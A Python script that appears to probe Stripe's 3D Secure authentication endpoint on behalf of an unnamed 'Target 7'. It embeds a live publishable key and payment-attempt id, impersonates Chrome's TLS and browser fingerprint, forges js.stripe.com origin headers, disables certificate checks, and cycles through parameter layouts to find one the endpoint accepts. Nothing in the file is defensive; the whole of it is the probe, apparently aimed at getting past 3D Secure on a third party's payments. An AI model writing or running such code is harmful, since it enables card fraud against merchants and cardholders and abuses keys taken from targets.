import asyncio
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession

# Source payatt_ from Target 7
source = "payatt_3U9QM9FhtKIxGoQc0iOs8DgX"
pk = "pk_live_51PyMsPFhtKIxGoQcqCKkwzO5vOMoMpqOQ8fJf1kmdHUyR9f4cdZTsaHFj8oseFDrZAYVwxN6FoQhb7u3Omprqf2c00xBClzh9C"

browser = {
    "fingerprintAttempted": True,
    "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "language": "en-US",
    "colorDepth": 24,
    "screenHeight": 1080,
    "screenWidth": 1920,
    "timeZoneOffset": -120,
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "javaEnabled": False,
    "javascriptEnabled": True,
}

async def probe():
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        # Check different payload keys for 3ds2/authenticate
        payloads = [
            {"key": pk, "source": source, "browser": json.dumps(browser)},
            {"key": pk, "payment_attempt": source, "browser": json.dumps(browser)},
            {"key": pk, "three_d_secure_2_source": source, "browser": json.dumps(browser)},
            {"key": pk, "source": source, "three_d_secure_2[browser]": json.dumps(browser)},
            {"key": pk, "three_d_secure_2[source]": source, "three_d_secure_2[browser]": json.dumps(browser)},
        ]
        
        for p in payloads:
            try:
                r = await s.post(
                    "https://api.stripe.com/v1/3ds2/authenticate",
                    data=p,
                    headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
                    timeout=8
                )
                print(f"POST /3ds2/authenticate with keys {list(p.keys())} -> status {r.status_code}")
                print("Response:", r.text[:300])
                print("-" * 50)
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(probe())
